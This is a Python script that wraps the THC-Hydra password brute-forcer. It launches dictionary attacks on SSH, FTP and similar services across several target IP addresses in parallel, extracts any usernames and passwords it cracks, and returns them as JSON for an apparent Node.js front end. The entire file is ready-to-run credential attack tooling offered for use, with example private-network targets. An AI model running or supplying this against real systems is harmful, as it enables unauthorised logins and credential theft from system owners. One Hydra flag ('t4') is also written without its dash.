#!/usr/bin/env python3
from subprocess import run, PIPE, DEVNULL
from multiprocessing import Process, Queue
import json
import re

"""
    Automating the Hydra password bruteforcer.

    Author: Yusef Karim
    NOTE: Contact me on Telegram if any issues arise when using these functions

    NOTE: Hydra has an option to output by default in JSON format but it does not
    always output valid JSON, thus regex is used to parse the found credentials.

    NOTE: Hydra has an option to do multiple hosts at once but everytime I tried to
    bruteforce SSH with multiple hosts Hydra would crash so I only allow one host.
    You can use the launch_multiple_hydras() function to launch Hydra on multiple
    hosts at the same time.
"""

def launch_hydra(host, service, user_file, pass_file, queue=False):
    """
        Uses THC-Hydra to launch a dictionary attack on a single target.

        Args:
            host: IP address of the host you want to target
            service: Service you want to target ("ssh", "ftp", etc)
            user_file: Path to a file containing possible usernames (one per line)
            pass_file: Path to a file containing possible passwords (one per line)
            queue (optional): A multiprocessing queue object

        Returns:
            if queue == False:
                Returns a dictionary containg any found credentials
            else:
                Returns nothing, instead it puts the dictionary results in the passed queue
    """
    hydra = ['hydra', host, service, 't4', '-f', '-en', '-L', user_file, '-P', pass_file]
    result = { 'service': service, 'host': host, 'success': False }
    login_info = {}
    #queue.put((host,service, user_file))
    #return

    hydra_output = run(hydra, stdout=PIPE, stderr=DEVNULL).stdout
    pass_search = re.search(b"(?:target.*completed.*)(\d+)",hydra_output)
    number_of_passwords_found = int(pass_search.group(1)) if pass_search else 0

    if number_of_passwords_found > 0:
        login_list = re.findall(b"host.*\slogin:\s(.*)\spassword:(.*)", hydra_output)
        for login, password in login_list:
            result['login'] = login.decode().strip(' ')
            result['password'] = password.decode().strip(' ')
            result['success'] = True

    if queue == False:
        return result
    else:
        queue.put(result)


def launch_multiple_hydras(hosts_dict):
    """
        Uses the launch_hydra() function to spawn multiple password dictionary attacks
        using multiprocessing.

        Args:
            hosts_dict: A dictionary containing an array of hosts that you want to
                        bruteforce.

            EXAMPLE INPUT: hosts_dict = { 'hosts': [ { 'ip': "172.16.50.141",
                                                       'service': "ftp",
                                                       'userFile': "user.txt",
                                                       'passFile' :"pass.txt" },
                                                     { 'ip': "172.18.35.100",
                                                       'service': "ssh",
                                                       'userFile': "user.txt",
                                                       'passFile' :"pass.txt" } ] }

        Returns:
            Returns a dictionary containing an array of the same size as the input
            dictionary. This will contain password on success or empty dict of failure.

            EXAMPLE OUTPUT: results = { 'results': [ { "host": "172.18.35.100",
                                                       "login": "admin",
                                                       "password": "admin",
                                                       "service": "ssh",
                                                      "success": true },
                                                      ... ] }
    """
    num_of_hosts = 0
    queue = Queue()
    for host in hosts_dict['hosts']:
        p = Process(target=launch_hydra, args=(host['ip'], host['service'],
                    host['userFile'], host['passFile'], queue), daemon=True)
        num_of_hosts += 1
        p.start()

    results = {'results': []}
    for _ in range(num_of_hosts):
        results['results'].append(queue.get())

    return results


if __name__ == "__main__":
    # Example of creating hosts JSON object (this would be done on Node.js side)
    hosts_dict = { 'hosts': [ { 'ip': "172.16.50.141",
                                'service': "ftp",
                                'userFile': "user.txt",
                                'passFile' :"pass.txt" },
                              { 'ip': "172.16.50.141",
                                'service': "ssh",
                                'userFile': "user.txt",
                                'passFile' :"pass.txt" },
                              { 'ip': "172.16.50.125",
                                'service': "ssh",
                                'userFile': "user.txt",
                                'passFile' :"pass.txt" },
                              { 'ip': "172.18.35.100",
                                'service': "ssh",
                                'userFile': "user.txt",
                                'passFile' :"pass.txt" } ] }
    json_hosts = json.dumps(hosts_dict)

    # Example of loading the hosts from JSON again
    hosts_dict = json.loads(json_hosts)
    # Then call hydra function, passing hosts dict
    results_dict = launch_multiple_hydras(hosts_dict)
    # Example of converting results into JSON (don't need the pretty print)
    json_results = json.dumps(results_dict, indent=4, sort_keys=True)
    print(json_results)


